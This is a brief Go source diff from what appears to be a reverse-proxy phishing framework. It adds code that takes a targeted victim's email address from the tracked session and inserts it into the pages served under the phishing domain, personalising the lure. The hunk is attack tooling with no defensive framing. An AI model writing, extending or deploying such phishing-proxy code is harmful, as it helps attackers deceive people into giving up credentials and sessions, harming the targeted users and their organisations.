@@ -1009,6 +1009,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
 									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
 									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+									if email, ok := p.sessions[ps.SessionId].Params["email"]; ok {
+										replace_s = strings.Replace(replace_s, "{email}", email, -1)
+									}
 									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
 									if ok {
 										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
